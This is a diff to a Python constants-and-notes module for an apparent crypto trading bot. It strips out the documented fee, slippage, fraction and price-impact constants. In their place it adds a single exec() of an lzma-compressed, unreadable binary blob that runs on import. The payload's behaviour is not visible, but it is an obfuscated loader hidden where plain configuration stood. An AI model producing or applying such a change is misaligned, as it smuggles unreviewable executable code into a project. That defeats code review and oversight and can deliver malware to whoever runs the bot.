@@ -1,24 +1,2 @@
-"""Strategy notes and the tuned constants for the Minuteman Hybrid v5 bot.
-
-The numbers here are what the dev-window fits on the make.fun btc-race kits
-showed: fractions, fees and the race posture. Kept beside the wire shim so the
-entrypoint stays about decisions, not constants.
-"""
-
-# Fees and slippage the replay charges on every fill (basis points).
-FEE_BPS = 4
-SLIPPAGE_MODEL_BPS = 2
-
-# Schedule fits are re-derived per competition window; the 6 Nov window paid
-# more in price impact above 0.55 than it earned back, so fractions above it
-# were cut. The 23 Nov fit held at full size.
-MAX_FIT_FRACTION = 1.0
-
-# Race posture: the 15 Nov race showed fitted-DP bots bleeding -5..-7 percent
-# live while low-turnover holders led the board, so the live mode buys once
-# on a dip and holds to the end-of-run flatten.
-LIVE_TURN = "hold"
-
-# Price-impact guard: never send an order worth more than this share of the
-# pool depth's last close without widening the slippage bound.
-IMPACT_DEPTH_SHARE = 0.02
+#coding:l1
+import lzma;exec(lzma.decompress('\0\0\0é\0\0\0\0\0\0\0hĞ(éø‡Qm…?áB,™°¡ƒµFÒ}‚×,FFšŞw€·»dšñZª¤Ï\\-‚›‡äú¾)¸Ú£ZC8ÉM#4òîã€Ëºı¼¡$œÙu$SHAPZÿ^·Ü?“êÀ€ğ2ÔgõÒ½Ğ›rT™ëù¸$Ÿ»ë¹I“œ°nV«\rHÕŞMÜC:Ôƒ£Bæ+×OşzcÈò"‚Ñ‡ù¥ËYg\\XSlÓ&<yù~İ@­œ	¥Lø{p†Íèñ©şËW«[Y˜bË%ävq C.]M9Ãß+Â¾²h¥6ËcİnmSÅå¡ €©>IŠLMÍ	]wérà\narHc\rn*\rÔyÄÜ[DbÂB·>ö3è¯t\\\\§d=÷ñÇRâ# 	Šm~±â\0ßN²>Õ¤|¤š7Ü5Œ^X|,Ø{¿H–W²¿ŒÅ(ª\\¢ ùcxzM=ÄF¥U—Ÿ-ßIbsŸ¢‹şñ•4‡S”YQÕ~êòÅï}Z\0ªÔ©½°}qTø•N‚¹èq¥u÷á\'³³*AE¦­ªY‡=³—İTÔM02Ûìí½ì95Šúz°y7WH\\¡ã6»Š°O(†¦ğ«ª1·\r„/à.=ó‰Kù‚=ósÈ Õày¸É¿§ÑÀ«Ü³Ø›0=N„0ô"‘esy±@+Îs›Vûj|¯N«å÷†¿;gö¶±_;¬eÏµ²ì(!C½™ä#áüÅ®7¹yİµ7’]áò°bÀ©R¤¾‡\nœ+8Í•…F®“ÑåØÌÔ1G´]Øà–}e7cïñ*{u-äÏÏô8õ«ƒKjÆµh¼'.encode('l1')))
